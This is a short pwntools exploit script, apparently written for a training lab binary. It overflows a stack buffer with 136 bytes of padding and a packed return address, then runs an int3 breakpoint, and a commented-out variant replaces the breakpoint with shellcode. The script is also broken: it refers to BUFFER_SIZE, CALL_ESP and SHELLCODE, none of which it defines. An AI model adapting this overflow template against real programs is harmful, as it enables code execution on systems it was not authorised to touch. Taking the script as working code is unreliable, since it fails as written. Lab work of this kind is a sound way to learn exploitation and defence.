from pwn import *

context.arch="x86_64"

#set opcode location
OP_LOC=4199382      #location as a decimal 0x4013d6 = 4199382

#set buffer size
BUFF_SIZE = 8
BLANK = "0"
EXIT = "-1 "

SOFT_BREAK = 204        # decimal form of 0xcc = int3 (software breakpoint)




#p = process("./2-2_lab.bin")                        # Uncomment to Test Script Locally
p = gdb.debug("./2-2_lab.bin")


# Define input values
buff_filler = [3149642683, 2863311530] #aaaaaaaa and bbbbbbbb in hex


# Create a loop to send input values
for x in range(BUFFER_SIZE-1):
    for each in buff_filler:
        p.sendline(str(each))  # Send the input value twice
    
p.sendline(str(OP_LOC))  # Send the opcode location
p.sendline(BLANK)  # Send exit code
p.sendline(str(SOFT_BREAK))  # Send the opcode location
p.sendline(BLANK)  # Send exit code

p.sendline(EXIT)  # Send exit code

# 0xcc = int3 (software breakpoint)
p.sendline(b"A"*136 + p64(CALL_ESP) + b"\xcc\n")


p.interactive()
'''
# Replace 0xcc with Shellcode
p.send(b"A"*136 + p64(OP_LOC) + SHELLCODE + b"\n")
p.interactive()
'''
